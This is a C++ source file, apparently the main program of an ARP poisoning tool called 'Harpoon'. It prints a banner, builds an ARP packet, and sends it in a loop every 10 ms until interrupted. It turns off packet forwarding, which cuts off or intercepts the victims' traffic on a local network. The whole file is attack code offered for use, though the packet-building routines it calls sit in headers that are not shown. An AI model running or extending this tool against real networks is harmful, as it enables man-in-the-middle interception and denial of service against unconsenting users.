#include "std_include.hpp"

#include "network/address.hpp"
#include "network/sniffer.hpp"

static utils::static_initializer $([]()
{
	// Before application initialization
	utils::logger::reset_color();
}, []()
{
	// After application termination
	utils::logger::reset_color();
});

void print_fancy_ascii_header()
{
	utils::logger::set_color(COLOR_LOG_ERROR);
	printf("  _   _\n"
		" | | | | __ _ _ __ _ __   ___   ___  _ __\n"
		" | |_| |/ _` | '__| '_ \\ / _ \\ / _ \\| '_ \\\n"
		" |  _  | (_| | |  | |_) | (_) | (_) | | | |\n"
		" |_| |_|\\__,_|_|  | .__/ \\___/ \\___/|_| |_|\n"
		"                  |_|\n\n");
}

int main(int /*argc*/, char** /*argv*/)
{
	utils::set_environment();
	utils::logger::set_title("Harpoon");

#ifdef DEBUG
	utils::logger::set_verbose(true);
#else
	utils::logger::set_verbose(false);
#endif

	print_fancy_ascii_header();

	network::sniffer sniffer;
	sniffer.forward_packets(false);

	utils::signal_handler sig_handler([&sniffer]()
	{
		sniffer.stop();
	});

	std::thread worker([&]()
	{
		sniffer.create_arp_packet();

		utils::logger::info("Starting ARP poisoning");

		while (sniffer.is_running())
		{
			if (!sniffer.send())
			{
				utils::logger::warn("Failed to send packet");
			}

			std::this_thread::sleep_for(10ms);
		}
	});

	/*sniffer.on_packet([&](network::packet* packet)
	{

	});*/

	sniffer.run();

	if (worker.joinable()) worker.join();

	sniffer.forward_packets(false);
	return 0;
}
